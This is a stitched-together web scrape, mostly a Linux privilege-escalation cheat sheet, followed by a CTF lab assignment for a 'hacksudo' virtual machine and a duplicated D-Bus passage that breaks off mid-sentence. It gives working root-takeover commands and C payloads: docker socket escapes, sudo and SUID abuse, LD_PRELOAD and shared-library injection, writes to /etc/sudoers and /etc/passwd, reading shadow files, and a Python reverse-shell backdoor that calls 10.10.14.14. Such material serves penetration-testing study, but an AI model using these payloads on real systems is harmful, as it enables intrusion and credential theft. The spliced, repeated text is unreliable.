of its type Exploitation example: https://book.hacktricks.xyz/linux-unix/privilege-escalation/socket-command-injection HTTP sockets Note that there may be some sockets listening for HTTP requests ( I'm not talking about .socket files but about the files acting as unix sockets ). You can check this with: curl --max-time 2 --unix-socket /pat/to/socket/files http:/index If the socket respond with a HTTP request, then you can communicate with it and maybe exploit some vulnerability . Writable Docker Socket The docker socke t is typically located at /var/run/docker.sock and is only writable by root user and docker group. If for some reason you have write permissions over that socket you can escalate privileges. The following commands can be used to escalate privileges: docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh Use docker web API from socket without docker package If you have access to docker socket but you can't use the docker binary (maybe it isn't even installed), you can use directly the web API with curl . The following commands are a example to create a docker container that mount the root of the host system and use socat to execute commands into the new docker. # List docker images curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json ##[{\"Containers\":-1,\"Created\":1588544489,\"Id\":\"sha256:<ImageID>\",...}] # Send JSON to docker API to create the container curl -XPOST -H \"Content-Type: application/json\" --unix-socket /var/run/docker.sock -d '{\"Image\":\"<ImageID>\",\"Cmd\":[\"/bin/sh\"],\"DetachKeys\":\"Ctrl-p,Ctrl-q\",\"OpenStdin\":true,\"Mounts\":[{\"Type\":\"bind\",\"Source\":\"/\",\"Target\":\"/host_root\"}]}' http://localhost/containers/create ##{\"Id\":\"<NewContainerID>\",\"Warnings\":[]} curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start The last step is to use socat to initiate a connection to the container, sending an attach request socat - UNIX-CONNECT:/var/run/docker.sock POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1 Host: Connection: Upgrade Upgrade: tcp #HTTP/1.1 101 UPGRADED #Content-Type: application/vnd.docker.raw-stream #Connection: Upgrade #Upgrade: tcp Now, you can execute commands on the container from this socat connection. Others Note that if you have write permissions over the docker socket because you are inside the group docker you have more ways to escalate privileges . If the docker API is listening in a port you can also be able to compromise it . Containerd (ctr) privilege escalation If you find that you can use the ctr command read the following page as you may be able to abuse it to escalate privileges : https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation RunC privilege escalation If you find that you can use the runc command read the following page as you may be able to abuse it to escalate privileges : https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation D-Bus D-BUS is an inter-process communication (IPC) system , providing a simple yet powerful mechanism allowing applications to talk to one another , communicate information and request services. D-BUS was designed from scratch to fulfil the needs of a modern Linux system. D-BUS, as a full-featured IPC and object system, has several intended uses. First, D-BUS can perform basic application IPC, allowing one process to shuttle data to another\u2014think UNIX domain sockets on steroids . Second, D-BUS can facilitate sending events, or signals, through the system, allowing different components in the system to communicate and ultimately to integrate better. For example, a Bluetooth daemon can send an incoming call signal that your music player can intercept, muting the volume until the call ends. Finally, D-BUS implements a remote object system, letting one application request services and invoke methods from a different object\u2014think CORBA without the complications. (From here ). D-Bus uses an allow/deny model , where each message (method call, signal emission, etc.) can be allowed or denied according to the sum of all policy rules which match it. Each or rule in the policy should have the own , send_destination or receive_sender attribute set. Part of the policy of /etc/dbus-1/system.d/wpa_supplicant.conf : <policy user=\"root\"> <allow own=\"fi.w1.wpa_supplicant1\"/> <allow send_destination=\"fi.w1.wpa_supplicant1\"/> <allow send_interface=\"fi.w1.wpa_supplicant1\"/> <allow receive_sender=\"fi.w1.wpa_supplicant1\" receive_type=\"signal\"/> </policy> Therefore, if a policy is allowing your user in anyway to interact with the bus , you could be able to exploit it to escalate privileges (maybe just listing for some passwords?). Note that a policy that doesn't specify any user or group affects everyone ( <policy> ). Policies to the context \"default\" affects everyone not affected by other policies ( <policy context=\"default\" ). Learn how to enumerate and exploit a D-Bus communication here: https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation Network It's always interesting to enumerate the network and figure out the position of the machine.

If you can, you could be able to grab some credentials. timeout 1 tcpdump Users Generic Enumeration Check who you are, which privileges do you have, which users are in the systems, which ones can login and which ones have root privileges: #Info about me id || (whoami && groups) 2>/dev/null #List all users cat /etc/passwd | cut -d: -f1 #List users with console cat /etc/passwd | grep \"sh$\" #List superusers awk -F: '($3 == \"0\") {print}' /etc/passwd #Currently logged users w #Login history last | tail #Last log of each user lastlog #List all users and their groups for i in $(cut -d\":\" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort #Current user PGP keys gpg --list-keys 2>/dev/null Big UID Some Linux versions were affected by a bug that allow users with UID > INT_MAX to escalate privileges. More info: here , here and here . Exploit it using: systemd-run -t /bin/bash Groups Check if you are a member of some group that could grant you root privileges: https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe Clipboard Check if anything interesting is located inside the clipboard (if possible) if [ `which xclip 2>/dev/null` ]; then echo \"Clipboard: \"`xclip -o -selection clipboard 2>/dev/null` echo \"Highlighted text: \"`xclip -o 2>/dev/null` elif [ `which xsel 2>/dev/null` ]; then echo \"Clipboard: \"`xsel -ob 2>/dev/null` echo \"Highlighted text: \"`xsel -o 2>/dev/null` else echo \"Not found xsel and xclip\" fi Password Policy grep \"^PASS_MAX_DAYS\\|^PASS_MIN_DAYS\\|^PASS_WARN_AGE\\|^ENCRYPT_METHOD\" /etc/login.defs Known passwords If you know any password of the environment try to login as each user using the password. Su Brute If don't mind about doing a lot of noise and su and timeout binaries are present on the computer you can try to brute-force user using su-bruteforce . Linpeas with -a parameter also try to brute-force users. Writable PATH abuses $PATH If you find that you can write inside some folder of the $PATH you may be able to escalate privileges by creating a backdoor inside the writable folder with the name of some command that is going to be executed by a different user (root ideally) and that is not loaded from a folder that is located previous to your writable folder in $PATH. SUDO and SUID You could be allowed to execute some command using sudo or they could have the suid bit. Check it using: sudo -l #Check commands you can execute with sudo find / -perm -4000 2>/dev/null #Find all SUID binaries Some unexpected commands allows you to read and/or write files or even execute command. For example: sudo awk 'BEGIN {system(\"/bin/sh\")}' sudo find /etc -exec sh -i \\; sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh sudo tar c a.tar -I ./runme.sh a ftp>!/bin/sh less>! <shell_comand> NOPASSWD Sudo configuration might allow a user to execute some command with another user privileges without knowing the password. $ sudo -l User demo may run the following commands on crashlab: (root) NOPASSWD: /usr/bin/vim In this example the user demo can run vim as root , it is now trivial to get a shell by adding an ssh key into the root directory or by calling sh . sudo vim -c '!sh' SETENV This directive allows the user to set an environment variable while executing something: $ sudo -l User waldo may run the following commands on admirer: (ALL) SETENV: /opt/scripts/admin_tasks.sh This example, based on HTB machine Admirer , was vulnerable to PYTHONPATH hijacking in order to load an arbitrary python library while executing the script as root: sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh Sudo execution bypassing paths Jump to read other files or use symlinks . For example in sudeores file: hacker10 ALL= (root) /bin/less /var/log/ * sudo less /var/logs/anything less>:e /etc/shadow #Jump to read other files using privileged less ln /etc/shadow /var/log/new sudo less /var/log/new #Use symlinks to read any file If a wilcard is used (*), it is even easier: sudo less /var/log/../../etc/shadow #Read shadow sudo less /var/log/something /etc/shadow #Red 2 files Countermeasures : https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/ Sudo command/SUID binary without command path If the sudo permission is given to a single command without specifying the path : hacker10 ALL= (root) less you can exploit it by changing the PATH variable export PATH=/tmp:$PATH #Put your backdoor in /tmp and name it \"less\" sudo less This technique can also be used if a suid binary executes another command without specifying the path to it (always check with strings the content of a weird SUID binary) . Payload examples to execute. SUID binary with command path If the suid binary executes another command specifying the path , then, you can try to export a function named as the command that the suid file is calling. For example, if a suid binary calls /usr/sbin/service apache2 start you have to try to create the function and export it: function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; } export -f /usr/sbin/service Then, when you call the suid binary, this function will be executed LD_PRELOAD LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library. To avoid this mechanism being used as an attack vector for suid/sgid executable binaries, the loader ignores LD_PRELOAD if ruid != euid . For such binaries, only libraries in standard paths that are also suid/sgid will be preloaded. If you find inside the output of sudo -l the sentence: env_keep+=LD_PRELOAD and you can call some command with sudo, you can escalate privileges. Defaults env_keep += LD_PRELOAD Save as /tmp/pe.c #include <stdio.h> #include <sys/types.h> #include <stdlib.h> void _init() { unsetenv(\"LD_PRELOAD\"); setgid(0); setuid(0); system(\"/bin/bash\"); } Then compile it using: cd /tmp gcc -fPIC -shared -o pe.so pe.c -nostartfiles Finally, escalate privileges running sudo LD_PRELOAD=pe.so <COMMAND> #Use any command you can run with sudo SUID Binary \u2013 so injection If you find some weird binary with SUID permissions, you could check if all the .so files are loaded correctly . In order to do so you can execute: strace <SUID-BINARY> 2>&1 | grep -i -E \"open|access|no such file\" For example, if you find something like: pen(\u201c/home/user/.config/libcalc.so\u201d, O_RDONLY) = -1 ENOENT (No such file or directory) you can exploit it. Create the file /home/user/.config/libcalc.c with the code: #include <stdio.h> #include <stdlib.h> static void inject() __attribute__((constructor)); void inject(){ system(\"cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p\"); } Compile it using: gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c And execute the binary. GTFOBins GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.

Reusing Sudo Tokens In the scenario where you have a shell as a user with sudo privileges but you don't know the password of the user, you can wait him to execute some command using sudo . Then, you can access the token of the session where sudo was used and use it to execute anything as sudo (privilege escalation). Requirements to escalate privileges: You already have a shell as user \" sampleuser \" \" sampleuser \" have used sudo to execute something in the last 15mins (by default that's the duration of the sudo token that allows to use sudo without introducing any password) cat /proc/sys/kernel/yama/ptrace_scope is 0 gdb is accessible (you can be able to upload it) (You can temporarily enable ptrace_scope with echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope or permanently modifying /etc/sysctl.d/10-ptrace.conf and setting kernel.yama.ptrace_scope = 0 ) If all these requirements are met, you can escalate privileges using: https://github.com/nongiach/sudo_inject The first exploit ( exploit.sh ) will create the binary activate_sudo_token in /tmp . You can use it to activate the sudo token in your session (you won't get automatically a root shell, do sudo su ): bash exploit.sh /tmp/activate_sudo_token sudo su The second exploit ( exploit_v2.sh ) will create a sh shell in /tmp owned by root with setuid bash exploit_v2.sh /tmp/sh -p The third exploit ( exploit_v3.sh ) will create a sudoers file that makes sudo tokens eternal and allows all users to use sudo bash exploit_v3.sh sudo su /var/run/sudo/ts/ If you have write permissions in the folder or on any of the created files inside the folder you can use the binary write_sudo_token to create a sudo token for a user and PID . For example if you can overwrite the file /var/run/sudo/ts/sampleuser and you have a shell as that user with PID 1234, you can obtain sudo privileges without needing to know the password doing: ./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser /etc/sudoers, /etc/sudoers.d The file /etc/sudoers and the files inside /etc/sudoers.d configure who can use sudo and how. This files by default can only be read by user root and group root . If you can read this file you could be able to obtain some interesting information , and if you can write any file you will be able to escalate privileges . ls -l /etc/sudoers /etc/sudoers.d/ ls -ld /etc/sudoers.d/ If you can write you can abuse this permissions echo \"$(whoami) ALL=(ALL) NOPASSWD: ALL\" >> /etc/sudoers echo \"$(whoami) ALL=(ALL) NOPASSWD: ALL\" >> /etc/sudoers.d/README Other way to abuse these permissions: # makes it so every terminal can sudo echo \"Defaults !tty_tickets\" > /etc/sudoers.d/win # makes it so sudo never times out echo \"Defaults timestamp_timeout=-1\" >> /etc/sudoers.d/win DOAS There are some alternatives to the sudo binary such as doas for OpenBSD, remember to check its configuration at /etc/doas.conf permit nopass demo as root cmd vim Sudo Hijacking If you know that a user usually connects to a machine and uses sudo to escalate privileges and you got a shell within that user context, you can create a new sudo executable that will execute your code as root and then the users command. Then, modify the $PATH of the user context (for example adding the new path in .bash_profile) so we the user executed sudo, your sudo executable is executed. Note that if the user uses a different shell (not bash) you will need to modify other files to add the new path. For example sudo-piggyback modifies ~/.bashrc , ~/.zshrc , ~/.bash_profile . You can find another example in bashdoor.py Shared Library ld.so The file /etc/ld.so.conf indicates where are loaded the configurations files from . Typically, this file contains the following path: include /etc/ld.so.conf.d/*.conf That means that the configuration files from /etc/ld.so.conf.d/*.conf will be read. This configuration files points to another folders where libraries are going to be searched for. For example, the content of /etc/ld.so.conf.d/libc.conf is /usr/local/lib . This means that the system will search for libraries inside /usr/local/lib . If for some reason a user has write permissions on any of the paths indicated: /etc/ld.so.conf , /etc/ld.so.conf.d/ , any file inside /etc/ld.so.conf.d/ or any folder indicated inside any config file inside /etc/ld.so.conf.d/*.conf he may be able to escalate privileges. Take a look about how to exploit this misconfiguration in the following page: https://book.hacktricks.xyz/linux-unix/privilege-escalation/ld.so.conf-example RPATH level15@nebula:/home/flag15$ readelf -d flag15 | egrep \"NEEDED|RPATH\" 0x00000001 (NEEDED) Shared library: [libc.so.6] 0x0000000f (RPATH) Library rpath: [/var/tmp/flag15] level15@nebula:/home/flag15$ ldd ./flag15 linux-gate.so.1 => (0x0068c000) libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000) /lib/ld-linux.so.2 (0x005bb000) By copying the lib into /var/tmp/flag15/ it will be used by the program in this place as specified in the RPATH variable. level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/ level15@nebula:/home/flag15$ ldd ./flag15 linux-gate.so.1 => (0x005b0000) libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000) /lib/ld-linux.so.2 (0x00737000) Then create an evil library in /var/tmp with gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6 #include<stdlib.h> #define SHELL \"/bin/sh\" int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) { char *file = SHELL; char *argv[] = {SHELL,0}; setresuid(geteuid(),geteuid(), geteuid()); execve(file,argv,0); } Capabilities Linux capabilities provide a subset of the available root privileges to a process . This effectively breaks up root privileges into smaller and distinctive units . Each of these units can then be independently be granted to processes. This way the full set of privileges is reduced and decreasing the risks of exploitation. Read the following page to learn more about capabilities and how to abuse them : https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities Directory permissions In a directory the bit for execute implies that the user affected can \" cd \" into the folder. The read bit implies the user can list the files , and the write bit implies the user can delete and create new files . ACLs ACLs are a second level of discretionary permissions, that may override the standard ugo/rwx ones. When used correctly they can grant you a better granularity in setting access to a file or a directory , for example by giving or denying access to a specific user that is neither the file owner, nor in the group owner (from here ). Give user \"kali\" read and write permissions over a file: setfacl -m u:kali:rw file.txt Get files with specific ACLs from the system: getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null Open shell sessions In old versions you may hijack some shell session of a different user ( root ). In newest versions you will be able to connect to screen sessions only of your own user . However, you could find interesting information inside of the session . screen sessions hijacking List screen sessions screen -ls Attach to a session screen -dr <session> #The -d is to detacche whoever is attached to it screen -dr 3350.foo #In the example of the image tmux sessions hijacking Apparently this was a problem with old tmux versions .

SSH Debian OpenSSL Predictable PRNG - CVE-2008-0166 All SSL and SSH keys generated on Debian-based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug. This bug caused that when creating in those OS a new ssh key only 32,768 variations were possible . This means that all the possibilities can be calculated and having the ssh public key you can search for the corresponding private key . You can find the calculated possibilities here: https://github.com/g0tmi1k/debian-ssh SSH Interesting configuration values PasswordAuthentication: Specifies whether password authentication is allowed. The default is no . PubkeyAuthentication: Specifies whether public key authentication is allowed. The default is yes . PermitEmptyPasswords : When password authentication is allowed, it specifies whether the server allows login to accounts with empty password strings. The default is no . PermitRootLogin Specifies whether root can log in using ssh, default is no . Possible values: yes : root can login using password and private key without-password or prohibit-password : root can only login with private key forced-commands-only : Root can login only using privatekey cand if the commands options is specified no : no AuthorizedKeysFile Specifies files that contains the public keys that can be used for user authentication. I can contains tokens like %h , that will be replaced by the home directory. You can indicate absolute paths (starting in / ) or relative paths from the users home . For example: AuthorizedKeysFile .ssh/authorized_keys access That configuration will indicate that if you try to login with the private key of the user \" testusername \" ssh is going to compare the public key of your key with the ones located in /home/testusername/.ssh/authorized_keys and /home/testusername/access ForwardAgent/AllowAgentForwarding SSH agent forwarding allows you to use your local SSH keys instead of leaving keys (without passphrases!) sitting on your server. So, you will be able to jump via ssh to a host and from there jump to another host using the key located in your initial host . You need to set this option in $HOME/.ssh.config like this: Host example.com ForwardAgent yes Notice that if Host is * every time the user jumps to a different machine that host will be able to access the keys (which is a security issue). The file /etc/ssh_config can override this options and allow or denied this configuration. The file /etc/sshd_config can allow or denied ssh-agent forwarding with the keyword AllowAgentForwarding (default is allow). If you Forward Agent configured in an environment check here how to exploit it to escalate privileges . Interesting Files Profiles files The file /etc/profile and the files under /etc/profile.d/ are scripts that are executed when a user run a new shell . Therefore, if you can write or modify any of the you can escalate privileges . ls -l /etc/profile /etc/profile.d/ If any weird profile script is found you should check it for sensitive details . Passwd/Shadow Files Depending on the OS the /etc/passwd and /etc/shadow files may be using a different name or there may be a backup. Therefore it's recommended find all of hem and check if you can read them and check if there are hashes inside the files: #Passwd equivalent files cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null #Shadow equivalent files cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null In some occasions you can find password hashes inside the /etc/passwd (or equivalent) file grep -v '^[^:]*:[x\\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null Writable /etc/passwd First generate a password with one of the following commands. openssl passwd -1 -salt hacker hacker mkpasswd -m SHA-512 hacker python2 -c 'import crypt; print crypt.crypt(\"hacker\", \"$6$salt\")' Then add the user hacker and add the generated password. hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash E.g: hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash You can now use the su command with hacker:hacker Alternatively you can use the following lines to add a dummy user without a password. WARNING: you might degrade the current security of the machine. echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd su - dummy NOTE: In BSD platforms /etc/passwd is located at /etc/pwd.db and /etc/master.passwd , also the /etc/shadow is renamed to /etc/spwd.db . You should check if you can write in some sensitive file . For example, can you write to some service configuration file ? find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody for g in `groups`; do find \\( -type f -or -type d \\) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user For example, if the machine is running a tomcat server and you can modify the Tomcat service configuration file inside /etc/systemd/, then you can modify the lines: ExecStart=/path/to/backdoor User=root Group=root Your backdoor will be executed the next time that tomcat is started. Check Folders The following folders may contain backups or interesting information: /tmp , /var/tmp , /var/backups, /var/mail, /var/spool/mail, /etc/exports, /root (Probably you won't be able to read the last one but try) ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root Weird Location/Owned files #root owned files in /home folders find /home -user root 2>/dev/null #Files owned by other users in folders owned by me for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \\; 2>/dev/null; done #Files owned by root, readable by me but no world readable find / -type f -user root ! -perm -o=r 2>/dev/null #Files owned by me or world writable find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path \"/proc/*\" ! -path \"/sys/*\" ! -path \"$HOME/*\" 2>/dev/null #Writable files by each group I belong to for g in `groups`; do printf \" Group $g:\\n\"; find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path \"/proc/*\" ! -path \"/sys/*\" ! -path \"$HOME/*\" 2>/dev/null done done Modified files in last mins find / -type f -mmin -5 ! -path \"/proc/*\" ! -path \"/sys/*\" ! -path \"/run/*\" ! -path \"/dev/*\" ! -path \"/var/lib/*\" 2>/dev/null Sqlite DB files find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files fils=`find / -type f \\( -name \"*_history\" -o -name \".sudo_as_admin_successful\" -o -name \".profile\" -o -name \"*bashrc\" -o -name \"httpd.conf\" -o -name \"*.plan\" -o -name \".htpasswd\" -o -name \".git-credentials\" -o -name \"*.rhosts\" -o -name \"hosts.equiv\" -o -name \"Dockerfile\" -o -name \"docker-compose.yml\" \\) 2>/dev/null`Hidden files Hidden files find / -type f -iname \".*\" -ls 2>/dev/null Script/Binaries in PATH for d in `echo $PATH | tr \":\" \"\\n\"`; do find $d -name \"*.sh\" 2>/dev/null; done for d in `echo $PATH | tr \":\" \"\\n\"`; do find $d -type -f -executable 2>/dev/null; done Web files ls -alhR /var/www/ 2>/dev/null ls -alhR /srv/www/htdocs/ 2>/dev/null ls -alhR /usr/local/www/apache22/data/ ls -alhR /opt/lampp/htdocs/ 2>/dev/null Backups find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \\( -name \"*backup*\" -o -name \"*\\.bak\" -o -name \"*\\.bck\" -o -name \"*\\.bk\" \\) 2>/dev/nulll Known files containing passwords Read the code of linPEAS , it searches for several possible files that could contain passwords . Other interesting tool that you can use to do so is: LaZagne which is an open source application used to retrieve lots of passwords stored on a local computer for Windows, Linux & Mac. Logs If you can read logs, you may be able to find interesting/confidential information inside of them . The more strange the log is, the more interesting will be (probably). Also, some \" bad \" configured (backdoored?) audit logs may allow you to record passwords inside audit logs as explained in this post: https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/. aureport --tty | grep -E \"su |sudo \" | sed -E \"s,su|sudo,${C}[1;31m&${C}[0m,g\" grep -RE 'comm=\"su\"|comm=\"sudo\"' /var/log* 2>/dev/null In order to read logs the group adm will be really helpful. Shell files ~/.bash_profile # if it exists, read once when you log in to the shell ~/.bash_login # if it exists, read once if .bash_profile doesn't exist ~/.profile # if it exists, read once if the two above don't exist /etc/profile # only read if none of the above exist ~/.bashrc # if it exists, read every time you start a new shell ~/.bash_logout # if it exists, read when the login shell exits ~/.zlogin #zsh shell ~/.zshrc #zsh shell Generic Creds Search/Regex You should also check for files containing the word \" password \" in it's name or inside the content , also check for IPs and emails inside logs, or hashes regexps. I'm not going to list here how to do all of this but if you are interested you can check the last checks that linpeas perform. Writable files Python library hijacking If you know from where a python script is going to be executed and you can write inside that folder or you can modify python libraries , you can modify the os library and backdoor it (if you can write where python script is going to be executed, copy and paste the os.py library). To backdoor the library just add at the end of the os.py library the following line (change IP and PORT): import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.14\",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]); Logrotate exploitation There is a vulnerability on logrotate that allows a user with write permissions over a log file or any of its parent directories to make logrotate write a file in any location . If logrotate is being executed by root , then the user will be able to write any file in /etc/bash_completion.d/ that will be executed by any user that login. So, if you have write perms over a log file or any of its parent folder , you can privesc (on most linux distributions, logrotate is executed automatically once a day as user root ). Also, check if apart of /var/log there are more files being rotated . This vulnerability affects logrotate version 3.15.1 and below More detailed information about the vulnerability can be found in this page: https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition. You can exploit this vulnerability with logrotten . This vulnerability is very similar to CVE-2016-1247 (nginx logs), so whenever you find that you can alter logs, check who is managing those logs and check if you can escalate privileges substituting the logs by symlinks. /etc/sysconfig/network-scripts/ (Centos/Redhat) If, for whatever reason, a user is able to write an ifcf-<whatever> script to /etc/sysconfig/network-scripts or it can adjust an existing one, then your system is pwned . Network scripts, ifcg-eth0 for example are used for network connections. The look exactly like .INI files. However, they are ~~sourced~~ on Linux by Network Manager (dispatcher.d). In my case, the NAME= attributed in these network scripts is not handled correctly. If you have white/blank space in the name the system tries to execute the part after the white/blank space . Which means; everything after the first blank space is executed as root . For example: /etc/sysconfig/network-scripts/ifcfg-1337 NAME=Network /bin/id ONBOOT=yes DEVICE=eth0 ( Note the black space between Network and /bin/id ) Vulnerability reference: https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f init, init.d, systemd, and rc.d /etc/init.d contains scripts used by the System V init tools (SysVinit). This is the traditional service management package for Linux , containing the init program (the first process that is run when the kernel has finished initializing\u00b9) as well as some infrastructure to start and stop services and configure them. Specifically, files in /etc/init.d are shell scripts that respond to start , stop , restart , and (when supported) reload commands to manage a particular service. These scripts can be invoked directly or (most commonly) via some other trigger (typically the presence of a symbolic link in /etc/rc?.d/ ). (From here ) Other alternative to this folder is /etc/rc.d/init.d in Redhat /etc/init contains configuration files used by Upstart . Upstart is a young service management package championed by Ubuntu. Files in /etc/init are configuration files telling Upstart how and when to start , stop , reload the configuration, or query the status of a service. As of lucid, Ubuntu is transitioning from SysVinit to Upstart, which explains why many services come with SysVinit scripts even though Upstart configuration files are preferred. In fact, the SysVinit scripts are processed by a compatibility layer in Upstart. (From here ) systemd is a Linux initialization system and service manager that includes features like on-demand starting of daemons , mount and automount point maintenance, snapshot support, and processes tracking using Linux control groups. systemd provides a logging daemon and other tools and utilities to help with common system administration tasks.

The box was created with Virtualbox . Upon booting up use netdiscover tool to find the IP address. This is the target address based on whatever settings you have. You should verify the address just in case. You don't need to answer all questions in order. Skip some questions may not affect the next steps. Download: https://mega.nz/file/ix9VnA7Y#7LM1LXBta_kAeNrajXGkQhmwfbr5fIaQHykkWEPBjZY Mirror: https://pan.baidu.com/s/1D-YEa6cr3rcWXv49HgZtSw (Code: 1337) Setup Environment setup should use VirtualBox history version (VirtualBox 6.1.28 has a bug with Hyper-V, I used VirtualBox 6.0.24 and worked properly). You should setup Network as the following: The virtual image should enter the following promption: Debian GNU/Linux 10 hacksudo fog tty1 eth0: 192.168.xx.xxx hacksudo login: _ The second line is the ip address of virtual machine. Open your web browser, you can find this page in VM's ip address: You are done with configuration, now you can hack the machine and solve the challenges! If the ip address hasn't shown up, you can find it as below: Open you terminal (powershell.exe in Windows), and use ipconfig /all to find your Host-only NET ip address. Use any tool to scan the ip 192.168.xx.0/24 and you can find the virtual machine ip address. Otherwise, you can also use arp -a to find your Host-only Network address, and usually VM's ip address is followed. (1 pt) Port scan After the port scan, you should find several services running in the box. What's the version of the mysql service? Answer: x.x.x-xx.x.xx-MariaDB-x+debxxxx (replace all x to your answer) Hint: you can use nmap for port scanning. (1 pt) Web source code Access the website on port 80 . You can find here's some hint for the subsequent steps. What's the GitHub repo address you found in the source code? Answer: https://github.com/xxxxxxxx/xxxxxxxxxxx (replace all x to your answer) Hint: press F12 on the keyboard to open the Developer's Tools to view the source code (may vary for different browsers). (1 pt) Web directory discover Using web directory scanning, you can find a txt file under the website. What's the name of this txt file? Answer: xxxx.txt (replace all x to your answer) Hint: gobuster and dirbuster are both good web directory/file discovery tools. (1 pt) CMS vulnerability The CMS used in the website is CMS-MadeSimple . However, this CMS can be vulnerable in some versions. What's the version of CMS? Answer: x.x.x (replace all x to your answer) Hint: you can use whatweb to find out the version of services. (1 pt) Exploit CMS Now, using the vulnerability to find the username and the hashed password of the CMS. It's hard to break the hash string, but you can use this username to break other services on the server. The txt file you found above would help you to get the password for the ftp service on port 21 . What's the password (in plain text)? Answer: xxxxxx (replace all x to your answer) Hint: hydra is a widely used tool for password cracking. (1 pt) FTP and unzip Using the previous username and password, you can log into the FTP server. You may notice there's a zip file on the server. You need to break the password of the zip file. What's the password for the zip file? Answer: xxxxxx (replace all x to your answer) Hint: to crack the password of the zip files, you can check JohnTheRipper. (1 pt) Caesar Cipher After extracting the hacksudoSTEGNO.wav , you need to find what's inside this file. Recall what you've got till now, and find the CMS password. What's the password for CMS? Answer: xxxxxxxxxxxx (replace all x to your answer) Hint: CyberChef contains many useful cryptography tools. (1 pt) Upload RCE script You've got the CMS! Now you can enjoy accessing all website pages and put your files on the website. Why not let us dig deeper? Upload a PHP script to give you shell access. What's the first line of flag2.txt on the server? Answer: xxx xxxxxxxxxxxx xxxxx xxx xxx xxx xxxxx xxxxxx!!! (replace all x to your answer) Hint: here are some upload limits on the server. Find out how to bypass them. Hint: after uploading your RCE script, you can generate a reversed shell to get a pty shell (which would simplify your next steps).

D-BUS was designed from scratch to fulfil the needs of a modern Linux system. D-BUS, as a full-featured IPC and object system, has several intended uses. First, D-BUS can perform basic application IPC, allowing one process to shuttle data to another\u2014think UNIX domain sockets on steroids . Second, D-BUS can facilitate sending events, or signals, through the system, allowing different components in the system to communicate and ultimately to integrate better. For example, a Bluetooth daemon can send an incoming call signal that your music player can intercept, muting the volume until the call ends. Finally, D-BUS implements a remote object system, letting one application request services and invoke methods from a different object\u2014think CORBA without the complications. (From here ). D-Bus uses an allow/deny model , where each message (method call, signal emission, etc.) can be allowed or denied according to the sum of all policy rules which match it. Each or rule in the policy should have the own , send_destination or receive_sender attribute set. Part of the policy of /etc/dbus-1/system.d/wpa_supplicant.conf : <policy user=\"root\"> <allow own=\"fi.w1.wpa_supplicant1\"/> <allow send_destination=\"fi.w1.wpa_supplicant1\"/> <allow send_interface=\"fi.w1.wpa_supplicant1\"/> <allow 